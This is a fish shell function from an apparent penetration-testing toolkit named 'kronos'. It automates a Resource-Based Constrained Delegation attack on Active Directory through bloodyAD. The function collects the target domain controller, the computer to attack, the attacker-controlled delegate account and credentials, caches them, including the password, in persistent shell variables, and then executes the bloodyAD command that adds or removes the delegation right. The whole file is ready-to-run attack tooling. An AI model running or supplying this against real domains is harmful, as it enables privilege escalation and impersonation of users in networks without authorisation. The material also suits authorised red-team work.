# description: Resource-Based Constrained Delegation (RBCD) attack
function __kronos_rbcd --description "Resource-Based Constrained Delegation (RBCD) attack"
    argparse h/help q/quiet u/username= p/password= k/kerberos t/target-computer= m/delegate-to= a/action= w/wizard X/edit-cmd -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos rbcd [TARGET_DC] [OPTIONS]"
        echo ""
        echo "Perform RBCD attack (add/remove delegation) using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-computer NAME Computer to attack (e.g. 'web01')"
        echo "  -m, --delegate-to NAME     Computer to delegate to (e.g. 'attacker-pc\$')"
        echo "  -a, --action ACTION        Action (add, remove) - default: add"
        echo "  -u, --username USER        Auth username"
        echo "  -p, --password PASS        Auth password"
        echo "  -k, --kerberos             Use Kerberos authentication"
        echo "  -X, --edit-cmd             Edit the command before execution"
        echo "  -q, --quiet                Skip prompts and use fallbacks"
        echo "  -h, --help                 Show this help message"
        return 0
    end

    set -l target $argv[1]
    set -l target_comp $_flag_target_computer
    set -l delegate_to $_flag_delegate_to
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password

    # Standard Fallbacks & Cache
    if test -z "$target"
        set target $__KRONOS_CACHE_RBCD_TARGET
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end

    if test -z "$target_comp"; set target_comp $__KRONOS_CACHE_RBCD_TARGET_COMP; end
    if test -z "$delegate_to"; set delegate_to $__KRONOS_CACHE_RBCD_DELEGATE_TO; end

    if test -z "$auth_user"
        set auth_user $__KRONOS_CACHE_RBCD_AUTH_USER
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
    end
    if test -z "$auth_pass"
        set auth_pass $__KRONOS_CACHE_RBCD_AUTH_PASS
        if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end
    end

    # Interactive Fallback
    if not set -q _flag_quiet
        if test (count $argv) -eq 0; or set -q _flag_wizard
            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
            set -U __KRONOS_CACHE_RBCD_TARGET "$target"

            set target_comp (__kronos_ask "Target Computer to attack" "$target_comp"); or return 1
            set -U __KRONOS_CACHE_RBCD_TARGET_COMP "$target_comp"

            set delegate_to (__kronos_ask "Computer to delegate to" "$delegate_to"); or return 1
            set -U __KRONOS_CACHE_RBCD_DELEGATE_TO "$delegate_to"

            if test -z "$auth_user"; and not set -q _flag_kerberos
                set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
                set -U __KRONOS_CACHE_RBCD_AUTH_USER "$auth_user"
            end
        end
    end

    if test -z "$target"; echo "error: target DC is required" >&2; return 1; end
    if test -z "$target_comp"; echo "error: --target-computer is required" >&2; return 1; end
    if test -z "$delegate_to"; echo "error: --delegate-to is required" >&2; return 1; end

    set -l action "add"
    if test "$_flag_action" = "remove"; set action "remove"; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_list bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_list -k
    else
        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_list -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_list $action rbcd "$target_comp" "$delegate_to"

    __kronos_check_dep bloodyAD; or return 1

    set -l cmd_str ""
    for part in $cmd_list
        set cmd_str "$cmd_str "(string escape -- $part)
    end
    set cmd_str (string trim $cmd_str)

    if set -q _flag_edit_cmd
        set cmd_str (__kronos_edit_cmd "$cmd_str"); or return 1
    end

    echo "[*] Performing RBCD $action on $target_comp for $delegate_to..."
    eval $cmd_str
end
